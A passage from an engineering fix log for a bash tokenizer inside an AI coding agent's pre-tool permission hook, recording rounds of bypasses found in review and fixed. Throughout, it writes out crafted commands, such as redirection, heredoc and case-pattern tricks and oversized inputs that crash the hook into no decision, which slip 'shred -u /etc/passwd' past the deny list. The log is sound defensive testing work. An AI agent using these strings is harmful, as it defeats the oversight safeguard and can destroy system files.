  `2>&- printf ok` is reported as `2 - printf ok`, head `2`. Found by §10.5's
  generated corpus; pre-existing and byte-identical on `ca2a81a`, rev 1 and
  round 2. Direction-safe (`deny` → `ask`, never toward allow), pinned by
  `test_leading_fd_duplication_still_corrupts_the_head`, and out of scope here
  because fixing it means changing `_FD_DUP_FORMS_UNCHANGED`. **Worth its own
  task.**
- **§9.8's `X=1 time [[ … ]]` false-ask entry is withdrawn** — measured, bash
  does not read `[[` as a reserved word there either (§10.2), so the parser is
  right and there is no false ask.
- **`([[ … ]])` glued, with no space, still mis-splits** toward `ask` (§9.2).
  Unchanged in either direction.
- **`X=1 case a in …` and every CONSUMED-position `case`** now fold under a
  `case` head instead of emitting the arm bodies. bash refuses each string
  outright; the verdict is `ask`, or `deny` where the folded text still matches
  a deny pattern (measured for `2>&1 case a in a) shred … ;; esac`).
- **The parser is still a hand-written tokenizer, not bash.** Three review
  rounds found the same defect behind three doors, and walking the tokenizer's
  own paths found a fourth. What changed this round is that the rule is now
  derived from something structural, so a *new* door would have to add a token
  type — which one test fails on — rather than add a prefix.

  > **CORRECTION (round 4).** The last sentence is **refuted**. Two live doors
  > were open when it was written, and **neither added a token type**: `>|`
  > lexed as REDIRECT `>` plus `OP` `|`, and `1>&` as REDIRECT `1>` plus `OP`
  > `&`. Both use only token types the rule already knows — the defect was in
  > `_check_operator`, one layer below the rule, deciding *which* token type an
  > operator gets. The derivation is sound; what it derives from is the token
  > stream, and the token stream was wrong. A new door does not need a new
  > token type. It needs one operator the lexer table gets wrong, and the table
  > was a guess at bash's lexer. Round 4 replaces the guess with a
  > transcription (`BASH_OPERATOR_TOKENS`) and adds the grammar-axis test and
  > the operator-space sweep (§11.9, `TestBashOperatorTableIsBashs`) that a
  > parser-derived corpus cannot
  > provide.
- Everything else in §8.9 and §9.8 stands unchanged.

## 11. Fix log (round 4 — fixer, after the round-3 review FAILED)

The round-3 review certified the mechanism — reserved-word position derived
from the emitted token stream — and it holds. What it could not certify was the
thing one layer below it: **which token type an operator gets**, decided by
`_check_operator`'s hand-written list, which was a *guess at bash's lexer*.
Every operator that list got wrong became a spurious `OP`; `_at_reserved_word_
position` reads `OP → True`; so the redirect's TARGET became a place where `[[`
is the conditional keyword and every separator after it was swallowed. Two such
operators were live, and a third defect turned a parse into no decision at all.

### 11.1 The three blockers, reproduced before anything was changed

```
echo hi >| [[ ; shred -u /etc/passwd ]]    round 3: allow   (bare shred -> deny)
echo hi 1>& [[ ; shred -u /etc/passwd ]]   round 3: allow
( case a in a) shred -u /etc/passwd ;; esac)
                                           round 3: IndexError out of
                                                    validate_bash_command
```

Round-3 token streams, quoted from the probe:

```
'echo hi >| [[ ; shred -u /etc/passwd ]]'
  [('WORD','echo'), ('WORD','hi'), ('REDIRECT','>'), ('OP','|'),
   ('WORD','[['), ('WORD',';'), ('WORD','shred'), …]
  subs: ['echo hi', '[[ ; shred -u /etc/passwd ]]']

'echo hi 1>& [[ ; shred -u /etc/passwd ]]'
  [('WORD','echo'), ('WORD','hi'), ('REDIRECT','1>'), ('OP','&'),
   ('WORD','[['), ('WORD',';'), ('WORD','shred'), …]
  subs: ['echo hi', '[[ ; shred -u /etc/passwd ]]']
```

The `OP` in each is the door. bash agrees the tail runs, measured with a DEBUG
trap in a temporary directory:

```
>|     -> RUN:echo hi >| [[    RUN:printf TAIL ]]
1>|    -> RUN:echo hi >| [[    RUN:printf TAIL ]]
2>|    -> RUN:echo hi 2>| [[   RUN:printf TAIL ]]
9>|    -> RUN:echo hi 9>| [[   RUN:printf TAIL ]]
{v}>|  -> RUN:echo hi {v}>| [[ RUN:printf TAIL ]]
1>&    -> RUN:echo hi >&[[     RUN:printf TAIL ]]
;>|    -> RUN:echo hi   RUN:>| [[   RUN:printf TAIL ]]
->|    -> RUN:echo hi - >| [[  RUN:printf TAIL ]]
```

### 11.2 bash's redirection semantics, measured — not assumed

`echo hi N>& TARGETFILE`, run in a `mktemp -d`, bash 5.3.9:

```
>&    1>&    01>&   001>&   -> TARGETFILE created
0>&   00>&   2>&    3>&     -> "ambiguous redirect", nothing written
10>&  11>&   {v}>&           -> "ambiguous redirect", nothing written
>|    1>|    2>|    {v}>|    -> TARGETFILE created
{v}>  {v}>>  1>     1>>      -> TARGETFILE created
```

So `1>& word` is stdout duplicated onto a word, which IS `&> word` — the file
is written. **The test is on the fd's VALUE, not its text**: `001` is fd 1,
`10` is not. That is now the rule in `_is_bare_amp_write_redirect`.

### 11.3 The fix — the axis, not the two operators

`_check_operator`'s list is replaced by `BASH_OPERATOR_TOKENS`, transcribed
from bash's grammar (parse.y's `other_token_alist` plus the single-character
metacharacters) and **sorted longest-first at class-definition time**, so the
scan is a maximal munch rather than an order someone typed:

```
3-char  &>>  ;;&  <<-  <<<
2-char  &&  ||  |&  ;;  ;&  >>  <<  <&  >&  &>  <>  >|
1-char  |  ;  &  <  >
```

`FUSED_FD_OPERATORS = ['2>&1', '1>&2']` is scanned first — those are not bash
operators (bash reads NUMBER `2`, operator `>&`, word `1`) and are kept fused
only so the fd digit never leaks into the word buffer.

**`1>` is deleted.** bash has no `1>` operator, and matching it whole is what
shadowed `1>&` and `1>|` — and what made `echo x 1>> /etc/passwd` report the
*operator* `>` as its write target instead of the path. Everything `1>` used to
cover now goes through the fd-prefix branch, exactly as `2>` already did.

Six further changes, each with its own reason:

| change | why |
|---|---|
| `>|` added to `REDIRECTIONS`, `…_WITH_ARG`, `WRITE_…_WITH_ARG` | it writes the file in every spelling |
| `<<-` handled in the heredoc branch (the `-` belongs to the OPERATOR) | otherwise the delimiter scan returns empty, heredoc mode never opens, and the heredoc BODY is tokenized as commands |
| `<<<` excluded from the heredoc branch, lexed as its own redirect | it is a here-string: a word operand, no body |
| `_is_bare_amp_write_redirect` accepts fd prefix `1` (by value) | measured above; this is where `1>& FILE` becomes a write target |
| fd word extended to `{name}` (`_FD_VARNAME_RE`) | a leading `{v}>\|` leaked `{v}` as the sub-command HEAD; bash drops it (`echo hi {v}> f` prints `hi`) |
| fd word may only precede an operator starting with `<`/`>` | bash spells every `NUMBER redirection` rule that way; `&>` is not one, so in `printf A 2&> f` the `2` is a real ARGUMENT and swallowing it would DROP a word |

### 11.4 BLOCKER 3 — the `case_stack` underflow

`flush_current()` runs the case state machine, and its `esac` rule POPS the
statement. The pattern-`)` branch then did `case_stack[-1] = 'body'` blind. For
`( case a in a) … ;; esac)` the final `)` arrives with `esac` buffered: the
flush closes the statement, the stack is empty, `IndexError`. `main()`'s
blanket `except Exception: sys.exit(0)` converts that into **no decision** —
the deny is lost.

Fixed by guarding the assignment and falling through: an empty stack means this
`)` closes the enclosing GROUP, and a grouping paren is an ordinary character
everywhere else in the tokenizer. A **sibling underflow** with the same cause
was found in the `;;` arm-terminator branch and guarded the same way:

```
case a in b) esac;; esac   round 3: IndexError    round 4: ['case a in','esac','esac']
case a in b) esac;& esac   round 3: IndexError    round 4: ['case a in','esac','esac']
```

Per the brief, `(` stays in `CMD_POSITION_WORDS` — round 3's review certified
it and it fixed a real regression; mutation M28 (reverting it) is caught by 7
tests.

### 11.5 Deliverable 1 — the grammar-axis test

`TestBashOperatorTableIsBashs`, in `tests/test_integration_pretool.py`. The
operator lists in it are transcribed from **bash's grammar**, split by
production, and the parser is never consulted to build them:

```python
_BASH_REDIRECTION_OPERATORS = ('<','>','>>','>|','<>','<<','<<-','<<<',
                               '<&','>&','&>','&>>')
_BASH_CONTROL_OPERATORS     = ('&&','||','|&','|',';;&',';;',';&',';','&')
_BASH_FD_WORDS              = ('','1','2','3','9','01','{v}')
```

Four assertions:

1. `test_the_parser_knows_exactly_bashs_operators` — **set equality** with
   `BASH_OPERATOR_TOKENS`, so drift fails in either direction; plus the table
   is longest-first; plus `1>` is absent.
2. `test_check_operator_reproduces_bash_word_boundaries` — every operator is
   consumed WHOLE (`len(found) == len(op)`; consuming a shorter prefix is the
   defect, because the remainder is re-lexed) and classified into the right
   production. This is the test that fails loudly for an operator the parser
   does not know.
3. `test_bash_agrees_that_these_are_operators` — the transcription is measured:
   `printf '[%s]' A OP __t32_tail__` never puts `[__t32_tail__]` on stdout (so
   `OP` really is a word boundary), and for a redirection bash never runs the
   operand as a command.
4. `test_no_fd_word_spelling_turns_a_redirection_into_a_separator` — the
   cross-product `fd word × redirection` (84 spellings, covering `n>|`,
   `{v}>|`, `n>&word`, `n<&word`, `n<>`): the tokenizer emits **no `OP`** for
   any of them. An `OP` here is precisely the door.

### 11.6 Deliverable 2 — the standing operator-space sweep

Corpus: every 1–3 character string over `< > & | ; 1 2 -` under the fd-word
prefixes `''`, `3`, `{v}` — 1752 slots — in two shapes (`printf A <slot> TAIL`
and `printf A <slot> [[ ; TAIL ]]`), **3504 cases**. bash runs the tail in
1245 of them.

**The oracle is a shell function, not `$BASH_COMMAND`.** Reading the DEBUG
trap's text back means re-deriving "which word is the command name" from a
string full of redirections — i.e. re-implementing bash's lexer on the oracle
side, and getting `>|` wrong there too. A function runs only when bash treats
the word as a COMMAND; treated as a redirect target it silently creates a file
of that name. No parsing, no lexer, no shared blind spot.

Batched into ONE bash process (each case `eval`ed in its own subshell so a
syntax error is contained), the sweep costs **2.4 s**, so it is **wired into
the suite** rather than shipped as a separate script. Full suite 36.3 s → the
class adds ~2.4 s wall (measured: 4.35 s with the class, 2.09 s with it
deselected), about 6 %.

*bash never runs a command the parser did not report*, on this corpus:

```
                                          hidden of 3504
HEAD (ca2a81a, pre-task-32)               924
task 32 rev 1                             174
task 32 round 2                           174
task 32 round 3                            21   (18 `>|` spellings, 3 `1>&`)
task 32 round 4 (this)                      0
```

Round 3's 21, in full, are exactly the two families this round closed — no
third. Three sibling tests keep the sweep honest:
`test_the_operator_space_sweep_is_not_vacuous` (bash must still run the tail in
> 1000 cases), `test_no_operator_spelling_hides_a_command`, and
`test_no_operator_spelling_launders_a_deny` (epic-22 invariant 1 over the same
space; one-sided — `ask` is legitimate, `allow` is the bypass).

### 11.7 The MEDIUM — the write-destination gate

All of these create the file in bash; the middle column is what the gate saw.

```
                        round 3          round 4
echo x >& /etc/passwd   /etc/passwd      /etc/passwd
echo x 1>& /etc/passwd  (none)           /etc/passwd
echo x >| /etc/passwd   (none)           /etc/passwd
echo x 2>| /etc/passwd  (none)           /etc/passwd
echo x 1>> /etc/passwd  '>'  <-- the OPERATOR, reported as the target
                                         /etc/passwd
```

`test_every_spelling_that_writes_is_seen_by_the_write_gate` measures bash first
(the file must exist) and only then asserts the gate, over 14 spellings.

### 11.8 The round-3 path table, extended

`_RESERVED_WORD_POSITION_PATHS` grows 51 → 58 rows: `noclobber_write`,
`noclobber_fd1`, `noclobber_fd2`, `noclobber_varfd`, `fd1_amp_write`,
`here_string`, `heredoc_dash`. Every generated assertion the round-3 table
already carries — bash agreement on the `opens` column, tail visibility, no
deny laundering, no case-pattern opening — now runs on them too (402 → 458
subtests). Five of the seven fail on the round-3 parser; `here_string` and
`heredoc_dash` do not, because round 3 mis-parsed them in the *over-reporting*
direction.

### 11.9 Verification

| | round 3 | round 4 |
|---|---|---|
| `tests/run_all_tests.py` | 1446 ran, OK, 1 skipped | **1460 ran, OK, 1 skipped** |
| `bash_command_parser.py` self-test | 107 / 0 | **107 / 0** |
| `TestTrapHandlerAgainstRealBash` | 240 cases, no exemption list | **240, unchanged, still no exemption list** |
| `tests/scenario_check.py` | 2 pre-existing failures | **byte-identical filtered output, diffed** |
| `TestAmpersandIsACommandSeparator` | 17 / 21, green | **17 / 21, green** |
| `TestReservedWordPositionIsDerivedFromTokens` | 13 methods / 402 subtests | **13 / 458** (7 new table rows) |
| `TestBashOperatorTableIsBashs` | — | **14 methods / 158 subtests** |
| faithfulness sweep, 801-case path corpus | 7 hidden | **7 hidden** (identical `2>&-` family) |
| faithfulness sweep, 3504-case operator corpus | 21 hidden | **0 hidden** |
| real traffic (2082 distinct) | — | **0 verdict changes** |

> **CORRECTION (round 5) — the "801-case path corpus" does not exist in the
> checkout, and the "3504-case operator corpus" measures one POSITION.**
>
> 1. *801 cases.* Nothing in the repo produces 801 cases, and the §10.9 lineage
>    (`275 / 89 / 54 / 7 / 7`) cannot be re-derived from it either. The
>    path-derived corpus that DOES exist is
>    `_RESERVED_WORD_POSITION_PATHS` x `_GROUND_TRUTH_PAYLOADS`, consumed by
>    `test_bash_never_runs_a_command_the_parser_did_not_report`: **58 rows x 4
>    payloads = 232** cases when this row was written, **60 x 4 = 240** now.
>    Re-measured on that corpus, hidden commands are **HEAD 70, round 4 15,
>    round 5 0** — and round 4's 15 were invisible to round 4 because three of
>    those rows carried a `cat ` prefix and one carried the `known_gap`
>    exclusion. The number to quote is the one a reader can reproduce; 801 is
>    not.
> 2. *The table also grew from 51 to 58 rows during round 4* while this row
>    still said "801-case", so the seven rows round 4 added were never in the
>    corpus it reports on.
> 3. *3504 operator cases.* Real, reproducible, and **argument position only** —
>    `printf A <slot> TAIL`. Round 5 adds the POSITION axis (command start
>    after each of the five separators, heredoc bodies, `case` pattern lists):
>    **21024** cases, 7771 of which bash executes. On that corpus the round-4
>    parser hides **1946** and launders **1836**; see §12.5.

**Real-traffic differential.** 2082 distinct commands (3976 occurrences)
harvested from `~/.claude/bash_hook_debug.log` + rotated `.gz` archives +
`~/.claude/permission_requests.jsonl`, replayed under the real `SettingsLoader`
(asserted in the harness: `allow=295 deny=9 ask=0`), 0 parse exceptions in
every pass. 35 commands touch the round-4 surface.

```
round 3 -> round 4:   verdict 0    split 3    write-target 0   (fewer sub-commands: 0)
round 2 -> round 4:   verdict 0    split 3    write-target 0
HEAD    -> round 4:   verdict 0    split 5    write-target 0   (fewer sub-commands: 0)
```

**Direction of every change**, named rather than counted. All 3 round-3 →
round-4 split changes are the same one: a `<<<` here-string operand is no
longer reported as an ARGUMENT of the command.

```
IFS='|' read -r label url env <<< "$entry"
   round 3: read -r label url env "$entry"      round 4: read -r label url env
grep -v '===' <<<"$argv"
   round 3: grep -v '===' "$argv"               round 4: grep -v '==='
head -1 <<<"$out"
   round 3: head -1 "$out"                      round 4: head -1
```

The sub-command COUNT is identical in all three; only the reported text
narrows, and it narrows to what bash actually passes — a here-string is stdin
data, never an argument. That direction can in principle let a command match a
tighter allow pattern, so it is stated plainly rather than filed under "no
change": **measured, the verdict moved on none of them.** The two extra HEAD →
round-4 changes are round 3's own (`#` comment handling, and one command that
gains sub-commands). No command anywhere in the corpus lost a sub-command.

**Mutation matrix**, 16 mutations, each applied to a `/tmp` copy of
`.claude/hooks` + `tests` and scored against the whole
`test_integration_pretool.py` (the copy has 2 baseline failures that depend on
the checkout path, subtracted from every row).

| | mutation | caught by |
|---|---|---|
| M15 | drop `>\|` from the operator table | 7 |
| M16 | restore `1>` as a whole operator (the round-3 shadowing) | 7 |
| M17 | `1>&` loses the fd-1 exemption (reject every fd prefix) | 2 |
| M18 | `>&` accepts ANY fd prefix as the `&>` synonym | 2 |
| M19 | `>\|` is not a WRITE redirect | 1 |
| M20 | operator table scanned shortest-first (no maximal munch) | 18 |
| M21 | case-pattern `)` assigns `case_stack[-1]` unguarded | 2 |
| M22 | `;;` arm terminator assigns `case_stack[-1]` unguarded | 1 |
| M23 | drop `<<-` / `<<<` from the operator table | 2 |
| M24 | drop the `{name}` fd word | 1 |
| M25 | fd word may precede any operator | 1 |
| M26 | drop the fused `2>&1` / `1>&2` spellings | 6 |
| M27 | a REDIRECT reopens reserved-word position (whole-mechanism revert) | 11 |
| M28 | revert `(` from `CMD_POSITION_WORDS` (round 3's certified fix) | 7 |
| M29 | heredoc branch ignores the `<<-` spelling | 1 |
| M30 | `<<<` re-enters the heredoc branch | **0 — unobservable** |

> **CORRECTION (round 5) — the matrix is 15 caught / 1 SURVIVED, the numbering
> collides with §10.8's, and M30 is not unobservable.**
>
> 1. *Score.* "16 mutations" with one scoring 0 is **15 caught, 1 survived**.
>    Stated as a bare count of mutations it reads as a clean sheet; it was not
>    one, and the survivor was a live bypass.
> 2. *Numbering.* This table restarts at M15, and §10.8 already used M15-M23 for
>    round 3's mutations against the reserved-word rule. `M15`, `M17`, `M20`,
>    `M21`, `M22`, `M23` therefore each name TWO different mutations in this
>    document. Read round 3's as **R3-M1 .. R3-M23** (§10.8) and round 4's as
>    **R4-M1 .. R4-M16** (this table, in order: R4-M1 = M15 .. R4-M16 = M30).
>    Round 5's are **R5-M1 .. R5-M14** in §12.6.
> 3. *M30 (= R4-M16) is an UNCAUGHT MUTATION, not an unobservable branch.* The
>    shortest input that distinguishes the guard's presence is **8 characters**:
>
>    ```
>    [[<<< ]]      with the guard (round 4):  ['[[']
>                  without it (HEAD, round 5): ['[[ <<< ]]']
>    ```
>
>    and the live consequence is worse than a token-stream difference. The
>    guard skipped the heredoc branch's `flush_current()`, and `<` is a bash
>    METACHARACTER that ends the word before it. In `case` PATTERN mode, where
>    the operator scan is suppressed, nothing else ends that word:
>
>    ```
>    case a in esac<<<x ; shred -u /etc/passwd
>        HEAD -> deny      round 4 -> ALLOW      bash runs shred
>    ```
>
>    The reasoning that kept it ("a `<` can never start a delimiter, so the
>    scan already returns empty and falls through on its own") was correct
>    about the DELIMITER and silent about the FLUSH. Round 5 deletes the guard
>    (§12.4) and pins the case by
>    `test_the_here_string_guard_was_a_live_bypass`.
> 4. *M29's pin is inadequate.* `test_the_tab_stripping_heredoc_spelling_still_opens_a_heredoc`
>    tests only the multi-line `<<-` form — it certifies the recognition that
>    OPENED §12.1 and §12.2 and cannot see either. M25 (= R4-M11) is sound.

M25 and M29 survived the first pass and are the reason
`test_an_fd_word_only_binds_to_an_operator_bash_lets_it_bind_to` and
`test_the_tab_stripping_heredoc_spelling_still_opens_a_heredoc` exist.

**M30 is unobservable, and that is stated rather than papered over** (the same
disposition round 3 gave M13). The `command[i:i+3] != '<<<'` guard on the
heredoc branch is redundant *today*: a `<` can never start a delimiter, so the
delimiter scan already returns empty for `<<<` and falls through on its own. No
test can distinguish the guard's presence. It is kept — and now says so in the
source — because widening the delimiter character set later would otherwise
turn a here-string into a heredoc silently.

**The residual `n>&-` leak is unchanged and still direction-safe**, verified on
this round's parser:

```
2>&- printf ok ; printf T   ->  ['2 - printf ok', 'printf T']     (unchanged)
2>&- shred -u /tmp/x        ->  ask        (shred -u /tmp/x -> deny)
```

Byte-identical on `ca2a81a`, rev 1, round 2, round 3 and round 4; the same 7
cases of the 801-case corpus; pinned by
`test_leading_fd_duplication_still_corrupts_the_head`, and it remains the sole
entry of the path table's `known_gap` column (asserted). **It deserves its own
task** — fixing it means changing `_FD_DUP_FORMS_UNCHANGED`, which task 32
pins verbatim, and the `{v}` half of the same family was fixed this round only
because it needed no such change.

> **CORRECTION (round 5) — the extent is understated, the `{v}` claim is
> false, and the direction-safety claim holds only in ARGUMENT position.**
>
> 1. *"the `{v}` half of the same family was fixed this round" is false.*
>    `{v}>|` and `{v}>` were fixed; `{v}>&-` and `{v}>&2` were **byte-identical
>    to HEAD** on the round-4 parser:
>
>    ```
>                  HEAD             round 4          round 5
>    cmd {v}>&-    ['cmd {v} -']    ['cmd {v} -']    ['cmd']
>    cmd {v}>&2    ['cmd {v} 2']    ['cmd {v} 2']    ['cmd']
>    ```
>
>    The `{v}` FD-WORD was taught to the fd-prefix branch; the `{v}` half of
>    the fd-DUP family was not.
> 2. *Extent.* At least **18** spellings leaked, not one: `1>&-`, `2>&-`,
>    `3>&2`, `4>&1`, `2<&-`, `0<&3`, `{v}>&-`, `{v}>&2`, and the same set with
>    a space before the operand. `test_leading_fd_duplication_still_corrupts_the_head`
>    pinned ONE spelling and the `known_gap` COLUMN's row count — neither of
>    which measures the gap.
> 3. *Direction-safety holds in ARGUMENT position and fails at COMMAND START.*
>    The evidence offered was `2>&- shred -u /tmp/x -> ask`, which is true. But
>    the leaked word is only an extra argument when something precedes it; put
>    the same redirection at command-start position and it becomes the HEAD:
>
>    ```
>    echo hi ; 1>&- shred -u /tmp/x
>        HEAD    -> ['echo hi', '- shred -u /tmp/x']       head `-`   -> ask
>        round 4 -> ['echo hi', '1 - shred -u /tmp/x']     head `1`   -> ask
>        round 5 -> ['echo hi', 'shred -u /tmp/x']                    -> DENY
>    ```
>
>    `ask` instead of `deny` is a downgrade of a hard deny, and the round-5
>    sweep counts **40** such cases in the operator space. Round 5 closes the
>    whole family (§12.6); the `known_gap` column is now empty, asserted by
>    `test_leading_fd_duplication_no_longer_corrupts_the_head`.

**Blast radius, re-probed consumer by consumer under the LIVE merged settings**
(`deny = ['Bash(shred:*)', 'Bash(wipe:*)', 'Bash(mkfs:*)', 'Bash(dd:*)',
'Bash(usermod:*)', 'Bash(groupmod:*)', 'Bash(reboot)', 'Bash(shutdown)',
'Bash(poweroff)']`), with module resolution asserted so the probe cannot
silently fall back to the repo parser:

```
                                                  round 3      round 4
echo hi >| [[ ; shred -u /etc/passwd ]]           allow        deny
echo hi 1>& [[ ; shred -u /etc/passwd ]]          allow        deny
echo hi 2>| [[ ; shred -u /etc/passwd ]]          allow        deny
echo hi {v}>| [[ ; shred -u /etc/passwd ]]        allow        deny
( case a in a) shred -u /etc/passwd ;; esac)      IndexError   deny
shred -u /etc/passwd                              deny         deny
```

Identical through `permissions_mcp_lib._build_validator()` and
`pretool_hook.BashPermissionValidator`; `telegram_permission_router.py` builds
its validator inline from the same two modules and inherits identically;
`tests/scenario_check.py` output is byte-identical to round 3's.

### 11.10 Residual risk after round 4

- **Still not installed.** Unchanged, and still the largest exposure: every
  fix in §9, §10 and §11 is live in the working tree only. `~/.claude/hooks/`
  carries all of them until someone re-runs `./install-claude-config.sh`.
  Operator action.
- **The leading `n>&-`/`n>&m` head gap.** Unchanged, direction-safe, and now
  explicitly filed as worth its own task (§11.9).

  > **CORRECTION (round 5).** "Direction-safe" was measured in ARGUMENT
  > position only. At COMMAND-START position the leaked fd word becomes the
  > sub-command HEAD, which downgrades a hard `deny` to `ask` — see the
  > round-5 correction in §11.9. **CLOSED in round 5** (§12.6), together with
  > the fd-DUP OPERAND leak (`>&2` -> `2`) that is the same defect one token
  > later. The `known_gap` column is now empty.
- **`{v}>&` reports a write target bash refuses.** `echo x {v}>& /etc/passwd`
  is an "ambiguous redirect" in bash — nothing is written — but the parser
  reports `/etc/passwd` as a write destination. Over-reporting a write, so it
  costs a prompt and never an allow.
- **`;;`, `;&`, `;;&` outside a `case`** are now single `OP` tokens rather than
  two or three. bash rejects those strings outright, so nothing executes either
  way; the split is unchanged in effect.
- **The parser is still a hand-written tokenizer, not bash.** What changed this
  round is that its operator table is no longer an opinion: it is a
  transcription with a test that fails on drift in either direction, and a
  corpus derived from bash's grammar rather than from the parser's own paths.
  The next door, if there is one, will not be an operator — that axis is now
  swept exhaustively to 3 characters under every fd-word prefix.

  > **CORRECTION (round 5). The last sentence is refuted, in the same shape as
  > round 4's correction of round 3's.** The axis swept exhaustively was
  > *operator spelling*; the axis left unswept was *POSITION*. Every case in
  > the 3504 was `printf A <slot> TAIL` — the slot after a command word, which
  > is the one place a leaked word is a harmless extra ARGUMENT rather than the
  > sub-command HEAD. The very next door was an operator, and it was in the
  > corpus's alphabet: `<<-`, whose tab-stripped terminator round 4 recognized
  > without implementing. Extended with the position axis, the same alphabet
  > and the same three fd-word prefixes give 21024 cases, on which the round-4
  > parser hides **1946** commands and launders **1836** denies — against
  > HEAD's 2079 and 548. **Round 4 laundered more denied commands on this
  > corpus than the parser it replaced.** A sweep is only exhaustive over the
  > axes it varies, and "exhaustive" is a claim about the corpus, never about
  > the parser.
- Everything else in §8.9, §9.8 and §10.10 stands unchanged.


## 12. Fix log (round 5 — fixer, after the round-4 review FAILED)

The round-4 review certified the operator axis and found it genuinely closed:
`BASH_OPERATOR_TOKENS` is set-equal to bash's own token list, the scan is
maximal munch, `1>` is gone, `<<<` is a here-string, and the sweep it added
reads 0 hidden. All of that stands and none of it is touched here.

What the review found instead is that round 4 **opened three deny to allow
regressions and left two fail-open crash classes**, and that the sweep proving
"0 hidden" varied one axis — operator spelling — while holding the other one,
POSITION, fixed at "after a command word". That is the position where a leaked
word is a harmless extra argument. Move the identical slot to command start,
into a heredoc body, or into a `case` pattern list and the same parser hides
1946 commands and launders 1836 denies, against HEAD's 2079 and 548:

```
                                              HEAD (ca2a81a)  round 4   round 5
operator space, 21024 cases (7771 executed)
  commands bash ran that the parser hid            2079         1946        0
  denied commands laundered to `allow`              548         1836        0
```

**Round 4 laundered more denied commands on this corpus than the parser it
replaced.** Every regression below was found by adding the position axis; each
is measured against real bash, and each is watched to fail on the round-4
parser before it is fixed.

### 12.1 A heredoc operator ate the command name (item 1)

The tokenizer's heredoc branch consumes the delimiter word ITSELF and then
emits `REDIRECT '<<'`. `REDIRECTIONS_WITH_ARG` also listed `<<` and `<<-`, so
`_split_on_operators` dropped one MORE token — the command name.

```
<<EOF shred git status
    round 4 -> allow, ['git status']        bash: runs `shred git status`
echo hi ; <<-1 shred git status
    HEAD -> deny        round 4 -> ALLOW    bash: runs `shred git status`
```

Pre-existing for `<<`, and a **round-4 regression for `<<-`**: round 4 taught
the tokenizer to recognize the `<<-` spelling without removing it from that
table, so a redirection that HEAD never entered started eating a word.

Fix: `<<` and `<<-` are out of `REDIRECTIONS_WITH_ARG`, with the reason in the
table's own comment. `<<<` stays — the here-string's operand really is still in
the token stream when the operator scan emits it. Measured on real traffic
(§12.7) this extra skip was live: it dropped `ON.parse(m);` from a `cat > f
<<'JS'` script.

### 12.2 `<<-` was recognized without being implemented (item 2)

`<<-` exists for exactly one reason: the terminator line may be indented with
TABS. Round 4 added the recognition (consume the `-`, enter body mode) and left
the terminator test comparing at column 0 — so the canonical block never closed
and swallowed the rest of the script.

```
cat <<-EOF
\thello
\tEOF
shred git status
    HEAD -> deny (never entered body mode)     round 4 -> ALLOW, ['cat']
    bash -> runs `shred git status`
```

**Shipping half of `<<-` is worse than shipping neither half**, and the sweep
counts it: 1752 of round 4's 1946 hidden commands are this one defect.

Fix: the operator's `strip_tabs` flag is carried into body mode and the
terminator test skips leading tabs. The test is one closure, `closes_heredoc`,
used by both the place that transitions into body mode and the place that scans
it.

### 12.3 The first body line was never tested, and a quoted delimiter was truncated (item 3)

Two pre-existing defects, both live on HEAD.

*(a) The shortest legal heredoc never closed.* Body mode was entered on the
newline after the operator, and only a SUBSEQUENT newline ever triggered a
terminator test — so a heredoc whose terminator is its first body line ran to
end of input.

```
cat <<E
E
shred git status        HEAD and round 4 -> allow, ['cat']    bash runs shred
```

*(b) A quoted delimiter was scanned with the unquoted rule.* The delimiter scan
accepted only `[A-Za-z0-9_]`, so `<<'a b'` yielded the delimiter `a` and left
the closing quote orphaned in the stream — where it opened quote state that ran
to end of input.

```
cat <<'a b'
a b
shred git status        HEAD and round 4 -> allow, ['cat']    bash runs shred
```

Fix: the transition into body mode tests the first line, and a QUOTED delimiter
is taken verbatim up to its closing quote. A quoted delimiter that is empty,
unterminated, or spans a newline is refused outright rather than guessed at —
bash could never match a terminator line for those, and refusing the heredoc
leaves the following text to be tokenized as commands, which fails toward
`ask`.

**One implementation, not two.** `_parse_heredoc_delim` was already a copy of
the tokenizer's inline delimiter scan, kept in sync by a comment. Round 4
edited the inline copy only, so `<<-` inside `$(...)` and `` `...` `` kept the
old reading. Round 5 deletes the inline copy: the tokenizer, `_scan_paren_subst`
and `_scan_backtick` all call the one function, which now returns
`(delimiter, end, strip_tabs)`.

### 12.4 The `<<<` guard was a live bypass (item 4)

Round 4 kept `command[i:i+3] != '<<<'` on the heredoc branch, called it
unobservable, and scored its deletion (M30) as `0 — unobservable`. It was
neither unobservable nor harmless. The guard skipped the branch, and the first
thing in the branch is `flush_current()`. `<` is a bash METACHARACTER: it ENDS
the word before it. Inside a `case` pattern list — where the operator scan is
suppressed on purpose, because `|` alternates patterns there — nothing else
ends a word.

```
case a in esac<<<x ; shred -u /etc/passwd
    HEAD -> deny        round 4 -> ALLOW
    bash: `esac` is a word of its own, it closes the empty `case`, `<<<x` is
          that command's here-string, and the tail runs.
```

The same hole is wider than `<<<`, and the sibling is pre-existing and live on
HEAD too: `case a in esac<x ; shred -u /etc/passwd` -> allow.

Fix, in two parts:
1. The `<<<` guard and its comment are **deleted**. `_parse_heredoc_delim`
   rejects `<<<` on its own, so the branch flushes and then falls through to
   the operator scan, which emits the here-string.
2. An `esac` buffered in pattern mode is **flushed at the operator scan**, the
   same shape as the `]]` rule one line above it. Only `esac` gets this:
   measured, `case a in a<b ; …` and `case a in a<<b ; …` are bash SYNTAX
   ERRORS, so no other pattern word can hide a command this way, and flushing
   them would start splitting patterns bash keeps whole.

### 12.5 Two fail-open crashes (item 5)

`pretool_hook.main()` wraps the whole decision in `except Exception:
sys.exit(0)`. A raise is therefore not a crash — it is **no decision**, exit 0
with empty stdout, which Claude Code reads as "the hook had nothing to say".
Both of these were verified on the real hook path, not `--dry-run`:

```
("1" * 4301) + ">& f\nshred -u /etc/passwd"
    HEAD -> deny      round 4 -> exit 0, NO OUTPUT
    ValueError: CPython refuses int() on a decimal string over 4300 digits,
    and round 4's fd-1 exemption converted the whole prefix.

("$((" * 3000) + "\nshred -u /etc/passwd"
    HEAD and round 4 -> exit 0, NO OUTPUT
    RecursionError: _scan_arith re-tokenizes its interior, which re-enters
    _scan_arith. The `$(`, `` ` `` and `<(` spellings recurse through
    parse_with_offsets the same way.
```

Fix: the fd prefix is compared as TEXT (`lstrip('0') != '1'`), so no length can
raise; and `MAX_SUBSTITUTION_DEPTH = 64` bounds `parse_with_offsets`,
`_tokenize_with_quotes`/`_scan_arith` and `_scan_write_targets`. Past the cap
the nested text stays glued to its enclosing WORD, so the sub-command head
becomes that unmatchable word and the answer is `ask` — never `allow`.

**Whether `main()`'s blanket handler should fail CLOSED is not this task's
question** and nothing here changes it; that is
